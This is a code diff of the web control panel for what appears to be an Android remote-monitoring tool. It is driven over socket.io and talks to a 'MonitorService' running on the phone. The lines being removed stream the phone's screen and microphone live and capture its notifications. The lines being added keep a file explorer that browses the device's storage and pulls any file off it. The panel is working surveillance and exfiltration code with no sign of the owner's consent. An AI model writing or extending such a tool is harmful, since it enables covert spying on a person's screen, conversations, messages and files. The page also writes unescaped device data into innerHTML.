@@ -3,113 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monitor Dashboard</title>
+    <title>Device Monitor</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #eee; margin: 20px; }
-        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
-        .card { background: #1e1e1e; padding: 15px; border-radius: 10px; border: 1px solid #333; }
-        #screen-view { width: 100%; border-radius: 5px; background: #000; min-height: 200px; }
-        .log-box { height: 150px; overflow-y: auto; background: #000; padding: 10px; font-size: 0.9em; border-radius: 5px; }
-        button { background: #3498db; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; margin: 5px 0; }
-        button:hover { background: #2980b9; }
-        .notif-item { border-bottom: 1px solid #222; padding: 5px 0; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #333; margin-bottom: 20px; }
+        #file-list { 
+            height: 300px; overflow-y: auto; background: #000; 
+            padding: 10px; border-radius: 5px; font-family: monospace; 
+        }
+        .file-item { 
+            padding: 8px; border-bottom: 1px solid #222; cursor: pointer; color: #3498db; 
+        }
+        .file-item:hover { background: #222; }
+        .dir-item { color: #f1c40f; font-weight: bold; }
+        button { background: #27ae60; color: white; border: none; padding: 10px; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
 <body>
-    <h2>System Monitor Dashboard</h2>
-    <div class="container">
-        
-        <div class="card">
-            <h3>Live Screen</h3>
-            <img id="screen-view" src="">
-            <button onclick="send('start-screen')">Start Stream</button>
-            <button onclick="send('stop-screen')" style="background:#e74c3c">Stop</button>
-        </div>
-
-        <div class="card">
-            <h3>Live Audio</h3>
-            <button onclick="startAudio()">Listen Live</button>
-            <button onclick="send('stop-audio')" style="background:#e74c3c">Mute</button>
-            <p id="audio-status">Audio: Idle</p>
-        </div>
-
-        <div class="card">
-            <h3>Recent Notifications</h3>
-            <div id="notif-log" class="log-box"></div>
-        </div>
-
-        <div class="card">
-            <h3>Files</h3>
-            <button onclick="send('list-files:/storage/emulated/0')">Load Internal Storage</button>
-            <div id="file-list" class="log-box"></div>
-        </div>
-
+    <div class="card">
+        <h3>File Explorer</h3>
+        <p>Path: <span id="cur-path">/storage/emulated/0</span></p>
+        <button onclick="goHome()">Go Home</button>
+        <div id="file-list">Waiting for device to respond...</div>
     </div>
 
     <script>
         const socket = io();
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
-        let nextAudioTime = 0;
 
-        function send(cmd) { socket.emit('command', cmd); }
-
-        // Handle Screen
-        socket.on('data-stream', (b64) => {
-            document.getElementById('screen-view').src = "data:image/jpeg;base64," + b64;
-        });
-
-        // Handle Notifications
-        socket.on('notif-data', (data) => {
-            const log = document.getElementById('notif-log');
-            const item = `<div class="notif-item"><b>${data.app}:</b> ${data.title} - ${data.message}</div>`;
-            log.innerHTML = item + log.innerHTML;
-        });
-
-        // Handle Audio
-        function startAudio() {
-            if (audioCtx.state === 'suspended') audioCtx.resume();
-            send('start-audio');
-            document.getElementById('audio-status').innerText = "Audio: Streaming...";
+        function goHome() {
+            socket.emit('command', 'list-files:/storage/emulated/0');
         }
 
-        socket.on('audio-stream', (b64) => {
-            const binary = window.atob(b64);
-            const bytes = new Int16Array(binary.length / 2);
-            for (let i = 0; i < binary.length; i += 2) {
-                bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
+        // Listen for the file list from the phone
+        socket.on('file-list', (jsonString) => {
+            console.log("Displaying files...");
+            const container = document.getElementById('file-list');
+            container.innerHTML = '';
+            
+            try {
+                // MonitorService.java emits a JSONArray string
+                const files = JSON.parse(jsonString); 
+                
+                files.forEach(file => {
+                    const div = document.createElement('div');
+                    div.className = 'file-item ' + (file.isDir ? 'dir-item' : '');
+                    div.innerHTML = (file.isDir ? "📁 " : "📄 ") + file.name;
+                    
+                    div.onclick = () => {
+                        if (file.isDir) {
+                            document.getElementById('cur-path').innerText = file.path;
+                            socket.emit('command', 'list-files:' + file.path);
+                        } else {
+                            if(confirm("Download " + file.name + "?")) {
+                                socket.emit('command', 'download:' + file.path);
+                            }
+                        }
+                    };
+                    container.appendChild(div);
+                });
+            } catch (e) {
+                container.innerText = "Error parsing file list: " + e;
             }
-            const f32 = new Float32Array(bytes.length);
-            for (let i = 0; i < bytes.length; i++) f32[i] = bytes[i] / 32768.0;
-
-            const buffer = audioCtx.createBuffer(1, f32.length, 44100);
-            buffer.getChannelData(0).set(f32);
-            const source = audioCtx.createBufferSource();
-            source.buffer = buffer;
-            source.connect(audioCtx.destination);
-            nextAudioTime = Math.max(nextAudioTime, audioCtx.currentTime);
-            source.start(nextAudioTime);
-            nextAudioTime += buffer.duration;
         });
 
-        // Handle Files
-        socket.on('file-list', (json) => {
-            const files = JSON.parse(json).files;
-            const list = document.getElementById('file-list');
-            list.innerHTML = '';
-            files.forEach(f => {
-                const div = document.createElement('div');
-                div.style.cursor = "pointer";
-                div.innerHTML = (f.isDir ? "📁 " : "📄 ") + f.name;
-                div.onclick = () => f.isDir ? send('list-files:' + f.path) : send('download:' + f.path);
-                list.appendChild(div);
-            });
-        });
-
-        socket.on('file-download-ready', (f) => {
+        // Listen for actual file downloads
+        socket.on('file-download-ready', (fileObj) => {
             const a = document.createElement('a');
-            a.href = "data:application/octet-stream;base64," + f.data;
-            a.download = f.name;
+            a.href = "data:application/octet-stream;base64," + fileObj.data;
+            a.download = fileObj.name;
             a.click();
         });
     </script>
